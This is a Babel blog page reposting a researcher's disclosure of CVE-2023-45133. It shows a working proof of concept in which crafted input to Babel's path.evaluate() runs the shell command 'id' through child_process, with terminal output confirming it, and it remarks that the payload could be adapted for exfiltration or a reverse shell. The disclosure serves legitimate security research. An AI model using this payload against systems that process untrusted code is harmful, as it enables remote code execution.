<!doctype html><html lang=en dir=ltr class="blog-wrapper blog-post-page plugin-blog plugin-id-default" data-has-hydrated=false><meta charset=UTF-8><meta name=generator content="Docusaurus v3.7.0"><title data-rh=true>CVE-2023-45133: Finding an Arbitrary Code Execution Vulnerability In Babel · Babel</title><meta data-rh=true name=viewport content="width=device-width, initial-scale=1.0"><meta data-rh=true name=twitter:card content=summary_large_image><meta data-rh=true property=og:url content=https://babel.qubitpi.org/blog/2023/10/16/cve-2023-45133><meta data-rh=true property=og:locale content=en><meta data-rh=true name=docusaurus_locale content=en><meta data-rh=true name=docusaurus_tag content=default><meta data-rh=true name=docsearch:language content=en><meta data-rh=true name=docsearch:docusaurus_tag content=default><meta data-rh=true property=og:title content="CVE-2023-45133: Finding an Arbitrary Code Execution Vulnerability In Babel · Babel"><meta data-rh=true name=description content="On October 10th, 2023, I stumbled upon an arbitrary code execution vulnerability in Babel, which was subsequently assigned the identifier CVE-2023-45133. In this post, I’ll walk you through the journey of discovering and exploiting this intriguing flaw."><meta data-rh=true property=og:description content="On October 10th, 2023, I stumbled upon an arbitrary code execution vulnerability in Babel, which was subsequently assigned the identifier CVE-2023-45133. In this post, I’ll walk you through the journey of discovering and exploiting this intriguing flaw."><meta data-rh=true property=og:type content=article><meta data-rh=true property=article:published_time content=2023-10-18T00:00:00.000Z><meta data-rh=true property=article:author content=https://github.com/SteakEnthusiast/><link data-rh=true rel=icon href=/img/favicon.png><link data-rh=true rel=alternate href=https://babel.qubitpi.org/blog/2023/10/16/cve-2023-45133 hreflang=en><link data-rh=true rel=alternate href=https://babel.qubitpi.org/blog/2023/10/16/cve-2023-45133 hreflang=x-default><link data-rh=true rel=preconnect href=https://M7KGJDK6WF-dsn.algolia.net crossorigin=anonymous><link data-rh=true rel=canonical href=https://steakenthusiast.github.io/2023/10/11/CVE-2023-45133-Finding-an-Arbitrary-Code-Execution-Vulnerability-In-Babel/><script data-rh=true type=application/ld+json>{"@context":"https://schema.org","@id":"https://babel.qubitpi.org/blog/2023/10/16/cve-2023-45133","@type":"BlogPosting","author":{"@type":"Person","name":"William Khem Marquez","url":"https://github.com/SteakEnthusiast/"},"datePublished":"2023-10-18T00:00:00.000Z","description":"On October 10th, 2023, I stumbled upon an arbitrary code execution vulnerability in Babel, which was subsequently assigned the identifier CVE-2023-45133. In this post, I’ll walk you through the journey of discovering and exploiting this intriguing flaw.","headline":"CVE-2023-45133: Finding an Arbitrary Code Execution Vulnerability In Babel","isPartOf":{"@id":"https://babel.qubitpi.org/blog","@type":"Blog","name":"Blog"},"keywords":[],"mainEntityOfPage":"https://babel.qubitpi.org/blog/2023/10/16/cve-2023-45133","name":"CVE-2023-45133: Finding an Arbitrary Code Execution Vulnerability In Babel","url":"https://babel.qubitpi.org/blog/2023/10/16/cve-2023-45133"}</script><link rel=alternate type=application/rss+xml href=/blog/rss.xml title="Babel RSS Feed"><link rel=alternate type=application/atom+xml href=/blog/atom.xml title="Babel Atom Feed"><link rel=search type=application/opensearchdescription+xml title=Babel href=/opensearch.xml><script src=https://unpkg.com/@babel/standalone@^7.0.0/babel.min.js defer></script><script src=/js/components/mini-repl.js type=module></script><script src=/js/components/assumption-repl.js type=module></script><link rel=stylesheet href=/assets/css/styles.d49a075b.css><script src=/assets/js/runtime~main.e31b4d13.js defer></script><script src=/assets/js/main.f0ba77b0.js defer></script><body class=navigation-with-keyboard><script>!function(){var t,e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t=null!==e?e:window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":(window.matchMedia("(prefers-color-scheme: light)").matches,"light"),document.documentElement.setAttribute("data-theme",t)}(),function(){try{for(var[t,e]of new URLSearchParams(window.location.search).entries())if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id=__docusaurus><div role=region aria-label="Skip to main content"><a class=skipToContent_fXgn href=#__docusaurus_skipToContent_fallback>Skip to main content</a></div><nav aria-label=Main class="navbar navbar--fixed-top"><div class=navbar__inner><div class=navbar__items><button aria-label="Toggle navigation bar" aria-expanded=false class="navbar__toggle clean-btn" type=button><svg width=30 height=30 viewBox="0 0 30 30" aria-hidden=true><path stroke=currentColor stroke-linecap=round stroke-miterlimit=10 stroke-width=2 d="M4 7h22M4 15h22M4 23h22"/></svg></button><a class=navbar__brand href=/><div class=navbar__logo><img src=/img/babel.svg alt="Babel logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src=/img/babel.svg alt="Babel logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div></a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href=/docs/>Docs</a><a class="navbar__item navbar__link" href=/setup>Setup</a><a class="navbar__item navbar__link" href=/repl>Try it out</a><a class="navbar__item navbar__link" href=/videos/>Videos</a><a aria-current=page class="navbar__item navbar__link navbar__link--active" href=/blog>Blog</a><div class=navbarSearchContainer_Bca1><button type=button class="DocSearch DocSearch-Button" aria-label="Search (Command+K)"><span class=DocSearch-Button-Container><svg width=20 height=20 class=DocSearch-Search-Icon viewBox="0 0 20 20" aria-hidden=true><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke=currentColor fill=none fill-rule=evenodd stroke-linecap=round stroke-linejoin=round /></svg><span class=DocSearch-Button-Placeholder>Search</span></span><span class=DocSearch-Button-Keys></span></button></div><a href=https://opencollective.com/babel target=_blank rel="noopener noreferrer" class="navbar__item navbar__link">Donate<svg width=13.5 height=13.5 aria-hidden=true viewBox="0 0 24 24" class=iconExternalLink_nPIU><path fill=currentColor d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></svg></a><a class="navbar__item navbar__link" href=/team>Team</a><a href=https://github.com/babel/babel target=_blank rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width=13.5 height=13.5 aria-hidden=true viewBox="0 0 24 24" class=iconExternalLink_nPIU><path fill=currentColor d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type=button disabled title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live=polite aria-pressed=false><svg viewBox="0 0 24 24" width=24 height=24 class=lightToggleIcon_pyhR><path fill=currentColor d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"/></svg><svg viewBox="0 0 24 24" width=24 height=24 class=darkToggleIcon_wfgR><path fill=currentColor d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"/></svg></button></div></div></div><div role=presentation class=navbar-sidebar__backdrop></div></nav><div id=__docusaurus_skipToContent_fallback class="main-wrapper mainWrapper_z2l0"><div class="container margin-vert--lg"><div class=row><aside class="col col--3"><nav class="sidebar_re4s thin-scrollbar" aria-label="Blog recent posts navigation"><div class="sidebarItemTitle_pO2u margin-bottom--md">All Blog Posts</div><div role=group><h3 class=yearGroupHeading_rMGB>2025</h3><ul class="sidebarItemList_Yudw clean-list"><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2025/05/30/babel-8-beta>Announcing Babel 8 Beta</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2025/03/24/7.27.0>7.27.0 Released: better ecosystem alignment</a></ul></div><div role=group><h3 class=yearGroupHeading_rMGB>2024</h3><ul class="sidebarItemList_Yudw clean-list"><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2024/10/25/7.26.0>7.26.0 Released: stage 4 features enabled by default, and a new experimental code printer</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2024/07/26/7.25.0>7.25.0 Released: Safari bugfixes and duplicated named capturing groups</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2024/02/28/7.24.0>7.24.0 Released: Decorator updates and JSON modules imports</a></ul></div><div role=group><h3 class=yearGroupHeading_rMGB>2023</h3><ul class="sidebarItemList_Yudw clean-list"><li class=sidebarItem__DBe><a aria-current=page class="sidebarItemLink_mo7H sidebarItemLinkActive_I1ZP" href=/blog/2023/10/16/cve-2023-45133>CVE-2023-45133: Finding an Arbitrary Code Execution Vulnerability In Babel</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2023/09/25/7.23.0>7.23.0 Released: Decorator Metadata and many new `import` features!</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2023/05/26/7.22.0>7.22.0 Released: Explicit Resource Management support and Import Attributes parsing</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2023/02/20/7.21.0>7.21.0 Released: Inline RegExp modifiers, TypeScript 5.0, and Decorators updates</a></ul></div><div role=group><h3 class=yearGroupHeading_rMGB>2022</h3><ul class="sidebarItemList_Yudw clean-list"><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2022/10/27/7.20.0>7.20.0 Released: Deno target and TypeScript 4.9</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2022/09/05/7.19.0>7.19.0 Released: Stage 3 decorators and more RegExp features!</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2022/05/19/7.18.0>7.18.0 Released: Destructuring private elements and TypeScript 4.7</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2022/02/02/7.17.0>7.17.0 Released: RegExp 'v' mode and ... 🥁 decorators!</a></ul></div><div role=group><h3 class=yearGroupHeading_rMGB>2021</h3><ul class="sidebarItemList_Yudw clean-list"><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2021/10/29/7.16.0>7.16.0 Released: ESLint 8 and TypeScript 4.5</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2021/07/26/7.15.0>7.15.0 Released: Hack-style pipelines, TypeScript const enums and Rhino target support</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2021/05/10/funding-update>Babel is used by millions, so why are we running out of money?</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2021/04/29/7.14.0>7.14.0 Released: New class features enabled by default, TypeScript 4.3, and better CommonJS interop</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2021/02/22/7.13.0>7.13.0 Released: Records and Tuples, granular compiler assumptions, and top-level targets</a></ul></div><div role=group><h3 class=yearGroupHeading_rMGB>2020</h3><ul class="sidebarItemList_Yudw clean-list"><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2020/10/15/7.12.0>7.12.0 Released: TypeScript 4.1, strings as import/export names, and class static blocks</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2020/07/30/7.11.0>7.11.0 Released: ECMAScript 2021 support in preset-env, TypeScript 4.0 support, printing config and the future of `babel-eslint`</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2020/07/13/the-state-of-babel-eslint>The State of babel-eslint</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2020/05/25/7.10.0>7.10.0 Released: Class Fields in preset-env, '#private in' checks and better React tree-shaking</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2020/03/16/7.9.0>7.9.0 Released: Smaller preset-env output, Typescript 3.8 support and a new JSX transform</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2020/01/11/7.8.0>7.8.0 Released: ECMAScript 2020, .mjs configuration files and @babel/cli improvements</a></ul></div><div role=group><h3 class=yearGroupHeading_rMGB>2019</h3><ul class="sidebarItemList_Yudw clean-list"><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2019/11/08/babels-funding-plans>Babel's Funding Plans</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2019/11/05/7.7.0>7.7.0 Released: Error recovery and TypeScript 3.7</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2019/09/05/7.6.0>7.6.0 Released: Private static accessors and V8 intrinsic syntax</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2019/07/03/7.5.0>7.5.0 Released: dynamic import and F# pipelines</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2019/07/02/the-babel-podcast>The Babel Podcast</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2019/03/19/7.4.0>7.4.0 Released: core-js 3, static private methods and partial application</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2019/01/21/7.3.0>7.3.0 Released: Named capturing groups, private instance accessors and smart pipelines</a></ul></div><div role=group><h3 class=yearGroupHeading_rMGB>2018</h3><ul class="sidebarItemList_Yudw clean-list"><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2018/12/03/7.2.0>7.2.0 Released: Private Instance Methods</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2018/09/17/7.1.0>7.1.0 Released: Decorators, Private Static Fields</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2018/09/17/decorators>TC39 Standards Track Decorators in Babel</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2018/08/27/7.0.0>Babel 7 Released</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2018/07/27/removing-babels-stage-presets>Removing Babel's Stage Presets</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2018/07/19/whats-happening-with-the-pipeline-proposal>What's Happening With the Pipeline (|>) Proposal?</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2018/07/16/announcing-babels-new-partnership-with-trivago>Announcing Babel's New Partnership with trivago!</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2018/06/26/on-consuming-and-publishing-es2015+-packages>On Consuming (and Publishing) ES2015+ Packages</a></ul></div><div role=group><h3 class=yearGroupHeading_rMGB>2017</h3><ul class="sidebarItemList_Yudw clean-list"><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2017/12/27/nearing-the-7.0-release>Nearing the 7.0 Release</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2017/10/05/babel-turns-three>Babel Turns Three</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2017/09/12/planning-for-7.0>Planning for 7.0</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2017/09/11/zero-config-with-babel-macros>Zero-config code transformation with babel-plugin-macros</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/contributing-to-babel-three-lessons-to-remember>Contributing to Babel: Three Lessons to Remember</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/personal-experiences-at-babel-1-a-pr-with-unusually-high-number-of-reviews>Personal Experiences at Babel #1 — A PR with Unusually High Number of Reviews</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2017/08/09/babel-and-summer-of-code>Babel and Summer of Code 2017</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2017/03/01/upgrade-to-babel-7-for-tool-authors>Upgrade to Babel 7 for Tool Authors (WIP)</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2017/03/01/upgrade-to-babel-7>Upgrade to Babel 7 (moved)</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2017/02/13/6.23.0>6.23.0 Released</a></ul></div><div role=group><h3 class=yearGroupHeading_rMGB>2016</h3><ul class="sidebarItemList_Yudw clean-list"><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2016/12/07/the-state-of-babel>The State of Babel</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2016/11/16/6.19.0>6.19.0 Released</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2016/10/24/6.18.0>6.18.0 Released</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2016/09/28/6.16.0>6.16.0 Released</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2016/08/26/babili>Babili (babel-minify)</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2016/08/24/6.14.0>6.14.0 Released</a></ul></div><div role=group><h3 class=yearGroupHeading_rMGB>2015</h3><ul class="sidebarItemList_Yudw clean-list"><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2015/11/03/babel-doctor>Babel Doctor</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2015/10/31/setting-up-babel-6>Setting up Babel 6</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2015/10/29/6.0.0>6.0.0 Released</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2015/07/07/react-on-es6-plus>React on ES6+</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2015/05/14/function-bind>Function Bind Syntax</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2015/03/31/5.0.0>5.0.0 Released</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2015/02/23/babel-loves-react>Babel &lt;3 React</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2015/02/15/not-born-to-die>Not Born to Die</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2015/01/27/2to3>2to3</a><li class=sidebarItem__DBe><a class=sidebarItemLink_mo7H href=/blog/2015/01/12/6to5-esnext>6to5 + esnext</a></ul></div></nav></aside><main class="col col--7"><article class=""><header><h1 class=title_f1Hy>CVE-2023-45133: Finding an Arbitrary Code Execution Vulnerability In Babel</h1><div class="container_mt6G margin-vert--md"><time datetime=2023-10-18T00:00:00.000Z>October 18, 2023</time> · <!-- -->10 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--12 authorCol_Hf19"><div class="avatar margin-bottom--sm"><div class="avatar__intro authorDetails_lV9A"><div class=avatar__name><a href=https://github.com/SteakEnthusiast/ target=_blank rel="noopener noreferrer"><span class=authorName_yefp>William Khem Marquez</span></a></div><div class=authorSocials_rSDt></div></div></div></div></div></header><div id=__blog-post-container class=markdown>
<p>On October 10th, 2023, I stumbled upon an arbitrary code execution vulnerability in <a href=https://github.com/babel/babel/ target=_blank rel="noopener noreferrer">Babel</a>, which was subsequently assigned the identifier CVE-2023-45133. In this post, I’ll walk you through the journey of discovering and exploiting this intriguing flaw.</p>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class=admonitionHeading_Gvgb><span class=admonitionIcon_Rf37><svg viewBox="0 0 12 16"><path fill-rule=evenodd d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"/></svg></span>tip</div><div class=admonitionContent_BuS1><p>This article was originally published on <a href=https://steakenthusiast.github.io/ target=_blank rel="noopener noreferrer">William Khem Marquez's blog</a>. He also published a series on using Babel to deobfuscate JavaScript code: check it out!</div></div>
<p>Those who use Babel for reverse engineering/code deobfuscation love using Babel because of all of the built in functionality it provides. One of the most useful features is the ability to statically evaluate expressions using <code>path.evaluate()</code> and <code>path.evaluateTruthy()</code>. I have written about this in the previous articles:</p>
<ul>
<li><a href=https://steakenthusiast.github.io/2022/05/28/Deobfuscating-Javascript-via-AST-Manipulation-Constant-Folding/ target=_blank rel="noopener noreferrer">Constant Folding</a></li>
<li><a href=https://steakenthusiast.github.io/2022/06/14/Deobfuscating-Javascript-via-AST-Deobfuscating-a-Peculiar-JSFuck-style-Case/ target=_blank rel="noopener noreferrer">A Peculiar JSFuck-style Case</a></li>
</ul>
<p>Wait, did I say <em>statically evaluate</em>?</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id=the-exploit>The Exploit<a href=#the-exploit class=hash-link aria-label="Direct link to The Exploit" title="Direct link to The Exploit">​</a></h2>
<p>Before delving into the details, let’s take a look at the proof of concept I came up with:</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id=proof-of-concept>Proof of Concept<a href=#proof-of-concept class=hash-link aria-label="Direct link to Proof of Concept" title="Direct link to Proof of Concept">​</a></h3>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#4d4d4c;--prism-background-color:#fdfaeb><div class=codeBlockContent_biex><pre tabindex=0 class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style=color:#4d4d4c;background-color:#fdfaeb><code class=codeBlockLines_e6Vv><span class=token-line style=color:#4d4d4c><span class="token keyword" style=color:#8959a8>const</span><span class="token plain"> parser </span><span class="token operator">=</span><span class="token plain"> </span><span class="token function" style=color:#4271ae>require</span><span class="token punctuation">(</span><span class="token string" style=color:#718c00>"@babel/parser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token keyword" style=color:#8959a8>const</span><span class="token plain"> traverse </span><span class="token operator">=</span><span class="token plain"> </span><span class="token function" style=color:#4271ae>require</span><span class="token punctuation">(</span><span class="token string" style=color:#718c00>"@babel/traverse"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword module" style=color:#8959a8>default</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token keyword" style=color:#8959a8>const</span><span class="token plain"> source </span><span class="token operator">=</span><span class="token plain"> </span><span class="token template-string template-punctuation string" style=color:#718c00>`</span><span class="token template-string string" style=color:#718c00>String({  toString: Number.constructor("console.log(process.mainModule.require('child_process').execSync('id').toString())")});</span><span class="token template-string template-punctuation string" style=color:#718c00>`</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token keyword" style=color:#8959a8>const</span><span class="token plain"> ast </span><span class="token operator">=</span><span class="token plain"> parser</span><span class="token punctuation">.</span><span class="token method function property-access" style=color:#4271ae>parse</span><span class="token punctuation">(</span><span class="token plain">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token keyword" style=color:#8959a8>const</span><span class="token plain"> evalVisitor </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token function maybe-class-name" style=color:#4271ae>Expression</span><span class="token punctuation">(</span><span class="token parameter" style=color:#f5871f>path</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    path</span><span class="token punctuation">.</span><span class="token method function property-access" style=color:#4271ae>evaluate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token function" style=color:#4271ae>traverse</span><span class="token punctuation">(</span><span class="token plain">ast</span><span class="token punctuation">,</span><span class="token plain"> evalVisitor</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br></span></code></pre><div class=buttonGroup__atx><button type=button aria-label="Copy code to clipboard" title=Copy class=clean-btn><span class=copyButtonIcons_eSgA aria-hidden=true><svg viewBox="0 0 24 24" class=copyButtonIcon_y97N><path fill=currentColor d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/></svg><svg viewBox="0 0 24 24" class=copyButtonSuccessIcon_LjdS><path fill=currentColor d=M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z /></svg></span></button></div></div></div>
<p>This simply outputs the result of the <code>id</code> command to the terminal, as can be seen below.</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#4d4d4c;--prism-background-color:#fdfaeb><div class=codeBlockContent_biex><pre tabindex=0 class="prism-code language-text codeBlock_bY9V thin-scrollbar" style=color:#4d4d4c;background-color:#fdfaeb><code class=codeBlockLines_e6Vv><span class=token-line style=color:#4d4d4c><span class="token plain">┌──(kali㉿kali)-[~/Babel RCE]</span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">└─$ node exploit.js</span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),115(scanner),138(wireshark),141(kaboxer),142(vboxsf)</span><br></span></code></pre><div class=buttonGroup__atx><button type=button aria-label="Copy code to clipboard" title=Copy class=clean-btn><span class=copyButtonIcons_eSgA aria-hidden=true><svg viewBox="0 0 24 24" class=copyButtonIcon_y97N><path fill=currentColor d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/></svg><svg viewBox="0 0 24 24" class=copyButtonSuccessIcon_LjdS><path fill=currentColor d=M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z /></svg></span></button></div></div></div>
<p>Of course, the payload can be adapted to do anything, such as exfiltrate data or spawn a reverse shell.</p>
<img alt=😁 src=/assets/2023-10-16-cve-2023-45133/success.jpg style=display:block;margin-left:auto;margin-right:auto;width:50%>
